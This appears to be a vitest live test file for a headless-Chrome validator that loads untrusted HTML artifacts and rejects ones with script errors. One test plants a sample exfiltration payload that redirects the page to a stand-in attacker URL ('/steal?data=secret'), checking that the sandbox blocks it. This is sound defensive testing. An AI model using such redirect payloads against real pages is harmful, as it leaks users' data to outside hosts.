import { createServer } from 'node:http';
import type { AddressInfo } from 'node:net';
import { beforeAll, describe, expect, it } from 'vitest';
import { makeHeadlessArtifactValidator, resolveBrowserExecutablePath } from './headlessArtifactValidator.js';
import { FunctionalDefectError } from './artifactValidation.js';
import type { ArtifactValidator } from './artifactValidation.js';

// A LIVE test of the REAL headless-Chrome validator: it launches an actual browser and loads real
// artifacts, so it is gated behind TINKERPAD_LIVE=1 (needs a Chrome/Chromium install and takes a couple
// seconds per launch) and never runs in the normal suite or CI:
// `TINKERPAD_LIVE=1 npx vitest run headlessArtifactValidator.live`. It is the on-demand proof that the
// gate accepts a clean playground and rejects exactly the wave-1 defect classes (an uncaught TypeError,
// a script SyntaxError) with zero false positives — the ticket's evidence, made a repeatable test.
// [LAW:verifiable-goals] [LAW:behavior-not-structure]

const live = process.env.TINKERPAD_LIVE === '1';

describe.runIf(live)('headless artifact validator (live, real Chrome)', () => {
  // Resolve Chrome and build the validator in beforeAll, NOT at describe-body level: describe.runIf(false)
  // still evaluates its callback body at collection, so a describe-level resolveBrowserExecutablePath would
  // throw on a browserless CI runner and break the whole suite before any test runs. beforeAll does not run
  // for a runIf(false)-skipped suite, so collection stays effect-free. [LAW:effects-at-boundaries]
  let validator: ArtifactValidator;
  beforeAll(() => {
    validator = makeHeadlessArtifactValidator({ executablePath: resolveBrowserExecutablePath(process.env) });
  });

  it('passes a clean playground that uses canvas and requestAnimationFrame', async () => {
    const html = `<!doctype html><html><body><canvas id="c" width="200" height="200"></canvas>
<script>
  const ctx = document.getElementById('c').getContext('2d');
  ctx.fillStyle = 'tomato'; ctx.fillRect(10, 10, 80, 80);
  let t = 0;
  requestAnimationFrame(function loop(){ t++; if (t < 3) requestAnimationFrame(loop); });
</script></body></html>`;
    await expect(validator({ html })).resolves.toBeUndefined();
  }, 20_000);

  it('rejects a playground that throws an uncaught TypeError on load (wave-1 defect class 1)', async () => {
    const html = `<!doctype html><html><body><div id="app"></div>
<script>document.getElementById('does-not-exist').appendChild(document.createElement('span'));</script></body></html>`;
    await expect(validator({ html })).rejects.toBeInstanceOf(FunctionalDefectError);
    await expect(validator({ html })).rejects.toThrow('TypeError');
  }, 20_000);

  it('rejects a playground with a SyntaxError that kills a script block (wave-1 defect class 2)', async () => {
    const html = `<!doctype html><html><body>
<script>const x = ;</script></body></html>`;
    await expect(validator({ html })).rejects.toBeInstanceOf(FunctionalDefectError);
    await expect(validator({ html })).rejects.toThrow('SyntaxError');
  }, 20_000);

  it('rejects a playground that throws an uncaught error and then hangs the renderer (a timeout must not discard an observed defect)', async () => {
    // The first script throws (observed as a pageerror); the second wedges the renderer so `load` never
    // fires and the navigation times out. The observed error must still fail the gate — a timeout does not
    // silently launder a broken artifact into a pass. [LAW:no-silent-failure]
    const html = `<!doctype html><html><body>
<script>null.foo;</script>
<script>while (true) {}</script></body></html>`;
    await expect(validator({ html })).rejects.toBeInstanceOf(FunctionalDefectError);
  }, 30_000);

  it('blocks a main-frame navigation away from the throwaway origin (untrusted code cannot exfiltrate)', async () => {
    // An artifact that navigates the main frame to an external origin (window.location, or a meta-refresh)
    // must NOT reach the network — the request interceptor allows only our throwaway origin. A sentinel
    // server stands in for the attacker's host; it must receive zero requests. [LAW:no-silent-failure]
    let hits = 0;
    const sentinel = createServer((_request, response) => {
      hits += 1;
      response.end('ok');
    });
    await new Promise<void>((resolve) => sentinel.listen(0, '127.0.0.1', resolve));
    const url = `http://127.0.0.1:${(sentinel.address() as AddressInfo).port}/steal?data=secret`;
    const html = `<!doctype html><html><body><script>window.location = ${JSON.stringify(url)};</script></body></html>`;
    try {
      await validator({ html });
    } finally {
      sentinel.close();
    }
    expect(hits).toBe(0);
  }, 20_000);

  it('does NOT flag a playground that uses console.error for its own logging (no false positive)', async () => {
    const html = `<!doctype html><html><body>
<script>console.error('debug: initializing with fallback config'); document.body.textContent = 'ok';</script></body></html>`;
    await expect(validator({ html })).resolves.toBeUndefined();
  }, 20_000);

  it('passes a large artifact inlining assets up to the size cap (no data-URL size cliff)', async () => {
    const blob = 'x'.repeat(5 * 1024 * 1024);
    const html = `<!doctype html><html><body>
<script type="application/json" id="data">${blob}</script>
<script>document.body.textContent = 'bytes: ' + document.getElementById('data').textContent.length;</script></body></html>`;
    await expect(validator({ html })).resolves.toBeUndefined();
  }, 20_000);
});
